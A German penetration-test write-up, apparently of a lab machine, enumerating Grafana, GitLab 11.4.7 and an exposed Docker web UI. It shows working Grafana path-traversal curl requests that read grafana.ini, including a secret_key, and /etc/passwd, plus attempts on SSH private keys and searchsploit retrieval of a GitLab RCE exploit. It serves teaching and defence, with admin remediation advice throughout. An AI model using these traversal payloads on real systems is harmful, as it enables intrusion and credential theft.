+<span class="password">+ /robots.txt: Entry '/autocomplete/users/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
+<span class="password">+ /robots.txt: Entry '/help/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
+<span class="password">+ /robots.txt: contains 53 entries which should be manually viewed. See: [Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]</span>
+<span class="password">+ /help/: Help directory should not be accessible.</span>
+<span class="password">+ /public/: This might be interesting.</span>
+<span class="password">+ /search.vts: This might be interesting.</span>
+<span class="command">+ /help/home.html: Uncommon header 'x-gitlab-custom-error' found, with contents: 1.</span>
+<span class="password">+ /help.php: A help file was found.</span>
+<span class="password"> + /.well-known/openid-configuration: OpenID Provider Configuration Information.</span>
+<span class="password">+ 8157 requests: 0 error(s) and 14 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-06 23:18:39 (GMT2) (164 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="password">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich überprüfe erneut die `robots.txt` Datei für den Grafana-Dienst auf Port 3000, wie bereits im Nmap-Scan erwähnt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Datei ist sehr kurz und enthält nur `User-agent: *` und `Disallow: /`. Dies ist eine sehr restriktive `robots.txt`, die Crawlern im Wesentlichen anweist, die gesamte Website nicht zu indizieren. Für einen Angreifer ist die Hauptinformation hier, dass der Betreiber nicht möchte, dass die Seite indiziert wird, was auf sensible Inhalte hindeuten könnte, aber keine direkte Schwachstelle darstellt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Dokumentieren Sie die `robots.txt`, aber legen Sie den Fokus auf interaktive Bereiche wie die Login-Seite oder auf Endpunkte, die für bekannte Schwachstellen relevant sind.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `robots.txt` korrekt konfiguriert ist, aber verlassen Sie sich nicht darauf als Sicherheitsmaßnahme.
+            </p>
+            <p>
+                Analyse der `robots.txt` Datei für den Grafana-Dienst auf Port 3000:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:3000/robots.txt</span>
+<span class="command">User-agent: *</span>
+<span class="command">Disallow: /</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich navigiere zur Hauptseite der Docker Web UI auf Port 9000 und dokumentiere die Ansicht. Die Seite zeigt eine Liste der laufenden Container, was die Informationen aus dem Nmap-Scan bestätigt. Die Liste enthält die ID, Namen, Kommandos, Port-Mappings und Images der Container, die ich bereits analysiert habe.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese unauthentifizierte Web-Oberfläche, die detaillierte Informationen über die laufenden Docker-Container preisgibt, ist eine beachtliche Schwachstelle. Ich kann sehen, welche Dienste in welchen Containern laufen, ihre Images und Port-Mappings. Dies liefert mir wertvolle Informationen für die weitere Enumeration und potenzielle Container-Escape-Versuche, falls die UI interaktive Funktionen ohne Authentifizierung bietet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie die Docker Web-UI auf Port 9000 auf alle interaktiven Funktionen (z.B. Logs ansehen, Container starten/stoppen/exec, Images verwalten). Dies ist eine sehr vielversprechende Angriffsfläche.
+                <br>**Empfehlung (Admin):** **Dringend:** Entfernen Sie die ungeschützte Docker Web UI auf Port 9000 aus dem Netzwerkzugriff. Docker Management-Schnittstellen sollten niemals öffentlich zugänglich sein und immer eine starke Authentifizierung erfordern.
+            </p>
+            <p>
+                Analyse der Docker Web UI auf Port 9000 und Übersicht der laufenden Container:
+            </p>
+            <pre>
+<span class="command">http://192.168.2.215:9000/</span>
+<span class="command">docker web-ui</span>
+
+    <span class="command">containers</span>
+    <span class="command">logs</span>
+    <span class="command">stats</span>
+    |
+    <span class="command">images</span>
+    |
+    <span class="command">clients</span>
+
+<span class="command">4 containers</span>
+<span class="command">ID	Names	Command	Ports	Repository &amp; Tags	Status</span>
+<span class="command">3573	</span>
+
+    <span class="command">boring_tharp</span>
+
+	<span class="command">python /app/a..	0.0.0.0:8080-&gt;8080/tcp	whalesalad/docker-debug	Up an hour</span>
+<span class="command">12e8	</span>
+
+    <span class="command">gitlab-docker_web_1</span>
+
+	<span class="command">/assets/wrapp..	0.0.0.0:5022-&gt;22/tcp,0.0.0.0:50443-&gt;443/tcp,0.0.0.0:5080-&gt;80/tcp	gitlab/gitlab-ce:11.4.7-ce.0	Up an hour (healthy)</span>
+<span class="command">c2f5	</span>
+
+    <span class="command">grafana</span>
+
+	<span class="command">/run.sh	0.0.0.0:3000-&gt;3000/tcp	grafana/grafana-enterprise:8.3.0-ubuntu	Up an hour</span>
+<span class="command">4001	</span>
+
+    <span class="command">peaceful_jennings</span>
+
+	<span class="command">docker-webui ..	0.0.0.0:9000-&gt;9000/tcp	pottava/docker-webui	Up an hour</span>
+</pre>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">
+                **Analyse:** Basierend auf der Feroxbuster-Ausgabe auf Port 5080, die Endpunkte wie `/users/root/projects.json` zeigte, versuche ich, diese Endpunkte über die GitLab API (oder was auch immer dahintersteckt) abzufragen. Ich benutze `curl -s` und pipe die JSON-Ausgabe an `jq .` zur besseren Lesbarkeit. Dies ist ein Versuch, öffentlich zugängliche API-Endpunkte für Informationslecks zu finden. Parallel dazu versuche ich, das Repository `root/internal-stuff.git` von der GitLab-Instanz (Port 5080) mit `git clone` zu klonen, um zu sehen, ob es öffentlich zugänglich ist oder Anmeldedaten erfordert.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Abfrage von `/users/root/projects.json` zeigt ein leeres Ergebnis (`"count": 0`), was bedeutet, dass es keine öffentlich sichtbaren Projekte für den Benutzer "root" gibt. Der `git clone` Versuch schlägt fehl, da die Authentifizierung fehlschlägt (Ich breche die Passwortabfrage ab). Dies bestätigt, dass ich Anmeldedaten benötige, um auf Projekte zuzugreifen oder die API weiter zu nutzen. Der Weg über öffentlich zugängliche API-Endpunkte scheint blockiert zu sein. Der Fokus muss auf die Erlangung von Anmeldedaten oder die Ausnutzung einer Schwachstelle, die keine Authentifizierung erfordert (z.B. auf Grafana Port 3000), gelegt werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Da der direkte Zugriff auf GitLab-Projekte oder API-Endpunkte ohne Authentifizierung nicht möglich ist, konzentrieren Sie sich darauf, Anmeldedaten zu finden. Überprüfen Sie alle anderen gefundenen Dienste (Grafana, Docker UI) auf Schwachstellen, die Anmeldedaten oder einen initialen Shell-Zugriff ermöglichen könnten.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass GitLab-API-Endpunkte korrekt gesichert sind und keine sensiblen Informationen ohne Authentifizierung preisgeben. Private Repositorys sollten nicht öffentlich klonbar sein.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl -s http://192.168.2.215:5080/users/root/projects.json | jq .</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"html": "&lt;div class=\"js-projects-list-holder\"&gt;\n&lt;div class=\"nothing-here-block\"&gt;No projects found&lt;/div&gt;\n&lt;/div&gt;\n"</span>,
+  <span class="command">"count": 0</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/firefoxcrack]<br>└─# <span class="command">git clone http://192.168.2.215:5080/root/internal-stuff.git</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Klone nach 'internal-stuff'...</span>
+Username for 'http://192.168.2.215:5080': <span class="password">^C</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Angesichts der identifizierten GitLab-Version 11.4.7 und der Tatsache, dass ich Anmeldedaten benötige, suche ich auf Exploit-Datenbanken nach bekannten Schwachstellen für diese Version, insbesondere nach Remote Code Execution (RCE)-Exploits. Ich verwende `searchsploit`, das lokale Exploit-Datenbanken durchsucht. Der Befehl `searchsploit gitlab 11.4` sucht nach Einträgen, die "gitlab" und "11.4" im Titel enthalten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Wichtiger Fund!** Searchsploit listet zwei authentifizierte RCE-Exploits für GitLab 11.4.7 auf (Exploit-DB IDs 49257 und 49334). Einer davon (`49334.py`) ist ein Python-Skript und wird als vielversprechend für eine automatisierte Ausnutzung angesehen, sobald Anmeldedaten verfügbar sind. Es gibt auch einen Passwort-Reset-Exploit für neuere Versionen, der hier nicht relevant ist. Die RCE-Exploits sind authentifiziert, was bedeutet, ich benötige weiterhin einen gültigen Login.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Fokussieren Sie sich darauf, Anmeldedaten für GitLab zu erhalten, um diesen authentifizierten RCE-Exploit nutzen zu können. Speichern Sie das Exploit-Skript lokal und machen Sie sich mit dessen Usage vertraut.
+                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab umgehend auf eine Version, die nicht von diesen RCE-Schwachstellen betroffen ist.
+            </p>
+            <p>
+                Suche nach Exploits für GitLab Version 11.4.7 mit Searchsploit:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/firefoxcrack]<br>└─# <span class="command">searchsploit gitlab 11.4</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">------------------------------------------------------------ ---------------------------------</span>
+ <span class="command">Exploit Title                                              |  Path</span>
+<span class="password">------------------------------------------------------------ ---------------------------------</span>
+<span class="command">GitLab 11.4.7 - RCE (Authenticated) (2)                     | ruby/webapps/49334.py</span>
+<span class="command">GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)   | ruby/webapps/49257.py</span>
+<span class="command">GitLab CE/EE &lt; 16.7.2 - Password Reset                      | java/remote/51889.txt</span>
+<span class="password">------------------------------------------------------------ ---------------------------------</span>
+<span class="command">Shellcodes: No Results</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ich kopiere das vielversprechendste Python-Exploit-Skript für die Authentifizierte RCE in GitLab 11.4.7 (Exploit-DB ID 49334) in mein aktuelles Verzeichnis, um es später zu nutzen. Der Befehl `searchsploit -m 49334` kopiert das Skript.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Ich habe nun das notwendige Werkzeug, um die RCE-Schwachstelle in GitLab auszunutzen, sobald ich über gültige Anmeldedaten verfüge. Der nächste Schritt ist also klar: Ich muss einen Weg finden, mich bei GitLab anzumelden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Laden Sie relevante Exploits herunter und bereiten Sie sie vor, sobald Sie potenzielle Schwachstellen identifiziert haben.
+                <br>**Empfehlung (Admin):** Verfolgen Sie Exploit-Datenbanken und Sicherheitshinweise für die von Ihnen eingesetzte Software und patchen Sie umgehend, wenn Schwachstellen (insbesondere RCE) veröffentlicht werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">searchsploit -m 49334</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+  <span class="command">Exploit: GitLab 11.4.7 - RCE (Authenticated) (2)</span>
+      <span class="command">URL: [Link: https://www.exploit-db.com/exploits/49334 | Ziel: https://www.exploit-db.com/exploits/49334]</span>
+     <span class="command">Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py</span>
+    <span class="command">Codes: CVE-2018-19585, CVE-2018-19571</span>
+ <span class="command">Verified: False</span>
+<span class="command">File Type: Python script, ASCII text executable, with very long lines (359)</span>
+<span class="password">Copied to: /root/49334.py</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich beginne mit der Untersuchung des Grafana-Dienstes auf Port 3000 auf eine Local File Inclusion (LFI) Schwachstelle. Ich teste einen Path-Traversal-Payload (`../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`) im URL-Pfad, speziell in einem mutmaßlichen Endpunkt wie `/public/plugins/welcome/`, da Webanwendungen oft versuchen, Dateien basierend auf URL-Segmenten einzubinden. Die Option `--path-as-is` in `curl` ist wichtig, um die Dots (`..`) und Schrägstriche (`/`) nicht normalisieren zu lassen. Ich versuche, eine Konfigurationsdatei von GitLab zu lesen, da diese oft Anmeldedaten enthalten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der erste Versuch, die `secrets.yml` von GitLab über die vermutete Grafana-LFI zu lesen, schlägt fehl. Die Fehlermeldung `"message": "Plugin file not found"` deutet darauf hin, dass der Pfad nicht korrekt aufgelöst wird oder dass der Endpunkt `/public/plugins/welcome/` nicht für LFI anfällig ist, oder dass der Dateipfad nicht existiert oder nicht lesbar ist. Dies war ein erster Testversuch mit einer Hypothese.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Testen Sie verschiedene Endpunkte und verschiedene Path-Traversal-Payloads. Versuchen Sie, Systemdateien wie `/etc/passwd` zu lesen, um zu sehen, ob LFI überhaupt möglich ist und wie sich die Anwendung bei erfolgreichem oder fehlgeschlagenem Dateizugriff verhält.
+                <br>**Empfehlung (Admin):** Implementieren Sie eine strikte Validierung von Dateipfaden in URL-Parametern oder Pfadsegmenten, um Path-Traversal-Angriffe zu verhindern.
+            </p>
+            <p>
+                Versuch, GitLab-Konfigurationsdateien über eine potenzielle LFI in Grafana zu lesen:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/welcome/../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Plugin file not found"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ich teste einen weiteren GitLab-Konfigurationspfad (`../../../../../../../../etc/gitlab/gitlab-secrets.json`) über dieselbe mutmaßliche Grafana-LFI Schwachstelle.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Auch dieser Versuch schlägt fehl mit derselben Fehlermeldung `"message": "Plugin file not found"`. Das verstärkt die Vermutung, dass entweder dieser spezifische Pfad in der Grafana-Instanz nicht existiert oder nicht lesbar ist, oder dass der `/public/plugins/welcome/` Endpunkt doch nicht für LFI anfällig ist. Ich muss die LFI-Anfälligkeit selbst noch verifizieren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Als Nächstes die LFI-Anfälligkeit selbst verifizieren, z.B. durch den Versuch, `/etc/passwd` zu lesen, was auf nahezu jedem Linux-System existiert und lesbar ist.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlung zur Validierung von Dateipfaden).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/welcome/../../../../../../../../etc/gitlab/gitlab-secrets.json"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Plugin file not found"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich betrachte den Source Code der Grafana-Login-Seite auf Port 3000. Der Text im Bericht zeigt einen Ausschnitt des Codes mit einer JSON-Struktur, die verschiedene "panels" auflistet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Source Code der Login-Seite selbst gibt in diesem Ausschnitt keine offensichtlichen Hinweise auf Schwachstellen. Die gelisteten Panels sind Standardkomponenten von Grafana. Wichtiger ist die allgemeine Struktur der URL, die auf ein Plugin-Verzeichnis hindeutet (`/public/plugins/welcome/`), das ich für LFI-Versuche genutzt habe.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen Sie den gesamten Source Code auf Hinweise zu Endpunkten, Parametern, API-Schlüsseln oder Kommentaren, die nützliche Informationen enthalten könnten.
+                <br>**Empfehlung (Admin):** Vermeiden Sie es, unnötige oder sensible Informationen im öffentlich zugänglichen Source Code zu belassen.
+            </p>
+            <p>
+                Analyse des Source Codes der Grafana-Login-Seite:
+            </p>
+            <pre>
+<span class="command">view-source:http://192.168.2.215:3000/login</span>
+
+<span class="command">"panels":{</span>
+    <span class="command">"alertlist":{ ... },</span>
+    <span class="command">"annolist":{ ... },</span>
+    <span class="command">"barchart":{ ... },</span>
+    <span class="command">"bargauge":{ ... },</span>
+    <span class="command">"dashlist":{ ... },</span>
+    <span class="command">"graph":{ ... },</span>
+    <span class="command">"heatmap":{ ... }</span>
+<span class="command">}</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Ich verifiziere nun die LFI-Anfälligkeit auf dem Grafana-Dienst, indem ich versuche, die Standard-Systemdatei `/etc/grafana/grafana.ini` zu lesen. Ich verwende denselben Ansatz mit `curl --path-as-is` und Path-Traversal-Payloads, diesmal ausgehend von einem anderen Endpunkt, der ebenfalls in den Grafana-Plugins zu liegen scheint: `/public/plugins/alertlist/`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg!** Diesmal gibt die Anfrage den Inhalt der Datei `/etc/grafana/grafana.ini` zurück. Dies beweist eine ausnutzbare Local File Inclusion (LFI) Schwachstelle auf dem Grafana-Dienst über den Pfad `/public/plugins/alertlist/`. Ich kann nun beliebige Dateien auf dem System lesen, auf die der Grafana-Prozess Zugriff hat. Die Datei `grafana.ini` ist eine Konfigurationsdatei, die potenziell sensible Informationen wie Anmeldedaten für Datenbanken oder externe Dienste enthält. Besonders interessant sind die auskommentierten Standard-Anmeldedaten (`admin_user = admin`, `admin_password = admin`) und der `secret_key`. Während die Standard-Anmeldedaten wahrscheinlich geändert wurden, ist der `secret_key` potenziell nützlich.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie diese LFI, um weitere System- und Konfigurationsdateien zu lesen, die Anmeldedaten oder andere nützliche Informationen enthalten könnten (z.B. `/etc/passwd`, SSH-Schlüssel, andere Konfigurationsdateien). Der gefundene `secret_key` könnte für andere Angriffe relevant sein.
+                <br>**Empfehlung (Admin):** **Dringend:** Beheben Sie die LFI-Schwachstelle im Grafana-Dienst. Überprüfen Sie die Konfiguration, die den Dateizugriff über `/public/plugins/` ermöglicht. Stellen Sie sicher, dass sensible Konfigurationsdateien restriktive Dateisystemberechtigungen haben. Standard-Anmeldedaten müssen immer geändert werden.
+            </p>
+            <p>
+                Erfolgreiche Ausnutzung der LFI in Grafana zum Lesen der Konfigurationsdatei `/etc/grafana/grafana.ini`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">##################### Grafana Configuration Example #####################</span>
+<span class="command">#################################### Security ####################################</span>
+<span class="command">[security]</span>
+<span class="comment"># disable creation of admin user on first start of grafana</span>
+<span class="command">;disable_initial_admin_creation = false</span>
+
+<span class="comment"># default admin user, created on startup</span>
+<span class="command">;admin_user = admin</span>
+
+<span class="comment"># default admin password, can be changed before first start of grafana,  or in profile settings</span>
+<span class="command">;admin_password = admin</span>
+
+<span class="comment"># used for signing</span>
+<span class="command">;secret_key = <span class="password">SW2YcwTIb9zpOOhoPsMm</span></span>
+....
+...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der bestätigten LFI auf Grafana (Port 3000) versuche ich nun, die Datei `/etc/passwd` zu lesen, um eine Liste der Benutzer auf dem System zu erhalten. Ich verwende wieder den `curl --path-as-is` Ansatz.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg!** Ich konnte den Inhalt von `/etc/passwd` lesen. Dies liefert eine Liste aller Systembenutzer, ihrer UIDs, GIDs, Home-Verzeichnisse und Standard-Shells. Ich sehe Standardbenutzer wie `root`, `daemon`, `www-data` etc. und auch spezifische Benutzer wie `grafana` (UID 472) und einen Benutzer, der im Kontext des Ziels relevant sein könnte (später als `cachalot` im Home-Verzeichnis gefunden). Wichtig ist hier, dass `root` eine interaktive Shell (`/bin/bash`) hat, ebenso wie einige andere Systembenutzer. Der Benutzer `grafana` hat `/usr/sbin/nologin`, was bedeutet, er kann sich nicht direkt anmelden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Analysieren Sie die `/etc/passwd` Ausgabe sorgfältig auf nicht-standardmäßige Benutzer (UID > 1000) und Benutzer mit interaktiven Shells. Dies gibt potenzielle Ziele für die Privilege Escalation.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass nur Benutzer, die sich anmelden müssen, eine interaktive Shell zugewiesen haben.
+            </p>
+            <p>
+                Lesen der `/etc/passwd` Datei über die Grafana-LFI:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="command">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="command">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="command">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="command">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="command">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="command">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="command">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="command">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="command">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="command">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="command">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="command">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="command">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="command">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
+<span class="command">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
+<span class="command">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="command">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">grafana:x:472:0::/home/grafana:/usr/sbin/nologin</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der LFI versuche ich nun, SSH-Schlüsseldateien zu lesen. Ich beginne mit der `id_rsa` für den Benutzer `grafana` (`/home/grafana/.ssh/id_rsa`), da der Grafana-Prozess wahrscheinlich mit den Rechten des `grafana` Benutzers läuft und Zugriff auf dessen Home-Verzeichnis haben könnte. Ich nutze wieder `curl --path-as-is`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Versuch, die `id_rsa` von `grafana` zu lesen, schlägt mit `"message": "Plugin file not found"` fehl. Dies könnte bedeuten, dass die Datei nicht existiert, die Berechtigungen das Lesen verhindern oder die LFI den Zugriff auf `.ssh` Verzeichnisse oder Dateien mit Punkten im Namen blockiert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Testen Sie, ob die LFI das Lesen anderer Dateien im Home-Verzeichnis von `grafana` erlaubt (z.B. .bashrc) und ob das Lesen von Dateien mit Punkten möglich ist. Versuchen Sie auch, die öffentliche Schlüsseldatei (`id_rsa.pub`) zu lesen.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass private Schlüsseldateien (`id_rsa`) nur für den Eigentümer lesbar sind (`chmod 600`). LFI-Schwachstellen beheben, um jeglichen unbefugten Dateizugriff zu verhindern.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../home/grafana/.ssh/id_rsa"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Plugin file not found"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ich filtere die Ausgabe der zuvor ausgelesenen `/etc/passwd` Datei mit `grep sh`, um schnell alle Benutzer mit einer interaktiven Shell zu sehen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die gefilterte Liste zeigt nur den `root` Benutzer mit einer Shell (`/bin/bash`). Dies bedeutet, dass die anderen Benutzer (insbesondere `grafana`, `www-data` etc.) standardmäßig keine interaktive Shell für direkte Logins haben (abgesehen von Shells, die möglicherweise über Exploits oder Fehlkonfigurationen erlangt werden können). Dies konzentriert die PE-Bemühungen auf den Root-Account, falls kein anderer Benutzer mit Shell gefunden wird.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Obwohl hier nur Root gelistet ist, suchen Sie weiterhin nach anderen potenziellen Benutzerkonten mit Shells (z.B. UID > 1000), die möglicherweise nicht in `/etc/passwd` mit Standard-Shells gelistet sind, oder deren Shell-Zugriff durch andere Mittel (z.B. SSH-Keys) möglich ist.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass Systembenutzer, die keine interaktive Shell benötigen, `nologin` zugewiesen haben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../etc/passwd" | grep sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der LFI in Grafana versuche ich, SSH-Schlüsseldateien für den Root-Benutzer zu lesen: zuerst den privaten Schlüssel (`/root/.ssh/id_rsa`) und dann den öffentlichen Schlüssel (`/root/.ssh/id_rsa.pub`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Beide Versuche schlagen mit `"message": "Could not open plugin file"` fehl. Dies deutet darauf hin, dass die LFI wahrscheinlich keine Dateien im `/root/` Verzeichnis lesen kann. Dies ist eine wichtige Einschränkung der LFI. Es könnte an Dateisystemberechtigungen liegen oder an Filtern der LFI, die den Zugriff auf bestimmte Verzeichnisse (wie /root) oder Dateitypen verhindern.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Akzeptieren Sie die Einschränkung der LFI auf das `/root/` Verzeichnis. Konzentrieren Sie sich darauf, andere Dateien zu lesen, die von der LFI erreichbar sind und potenziell Anmeldedaten oder Hinweise auf PE-Vektoren enthalten (z.B. Konfigurationsdateien, Log-Dateien, History-Dateien von anderen Benutzern außerhalb von /root).
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/root/` nur für Root lesbar ist. LFI-Schwachstellen beheben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Could not open plugin file"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl --path-as-is "http://192.168.2.215:3000/public/plugins/alertlist/../../../../../../../../root/.ssh/id_rsa.pub"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">{</span>
+  <span class="command">"message": "Could not open plugin file"</span>
+<span class="command">}</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich teste systematisch, ob ich das `/root/` Verzeichnis oder Dateien darin über die Grafana-LFI auf Port 3000 lesen kann. Ich versuche, die Datei `authorized_keys` in `/root/.ssh/` und eine nicht existierende Datei `test` direkt in `/root/` zu lesen. Die Fehlermeldung ist jedes Mal `"Could not open plugin file"`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die wiederholten Fehlermeldungen bestätigen meine Hypothese – die LFI kann offenbar keine Dateien im `/root/` Verzeichnis lesen. Der Dateizugriff wird blockiert, was auf restriktive Berechtigungen oder LFI-Filterung hindeutet. Ich kann die LFI für andere Zwecke nutzen, aber nicht für das Auslesen von Dateien direkt aus `/root/`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Fokussieren Sie sich auf das Lesen von Dateien außerhalb von `/root/`, die potenziell sensible Informationen oder Anmeldedaten enthalten (z.B. andere Benutzer-Home-Verzeichnisse, Konfigurationsdateien in `/etc/`, Webserver-Logs).
